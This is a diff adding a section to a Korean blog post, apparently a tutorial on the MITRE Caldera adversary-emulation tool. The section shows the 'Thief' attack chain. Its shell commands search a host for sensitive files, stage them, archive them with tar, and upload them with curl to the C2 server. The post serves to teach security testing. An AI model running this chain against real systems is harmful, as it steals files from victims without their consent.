@@ -37,6 +37,33 @@ Caldera Server가 Victim host에게 수행할 수 있는 공격 전술입니다.
 ![image](assets/img/usage-of-caldera/operation_exec.png)
 - `Campaigns/Operation`에서 실행할 Attack Chain을 `Campaigns/Adversaries`에서 선택합니다.
     - 예시로 생성되어있던 `Thief`를 실행해 보았습니다.
+
+![image](assets/img/usage-of-caldera/adversaries_thief.png)
+- `Campaigns/Adversaries`의 `Thief` Attack Chain입니다.
+
+```bash
+# T1074.001 : Data Staged: Local Data Staging
+mkdir -p staged && echo $PWD/staged
+
+# T1005 : Data from Local System
+# plugins.stockpile.app.parsers.basic
+find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+
+# T1074.001 : Data Staged: Local Data Staging
+# plugins.stockpile.app.requirements.paw_provenance
+cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+
+# T1560.001 : Archive Collected Data: Archive via Utility
+# plugins.stockpile.app.requirements.paw_provenance
+tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz
+
+# T1041 : Exfiltration Over C2 Channel
+# plugins.stockpile.app.requirements.paw_provenance
+curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+```
+- 위와 같은 Chain이 Victim host를 대상으로 실행됩니다.
+
+
  
 
 
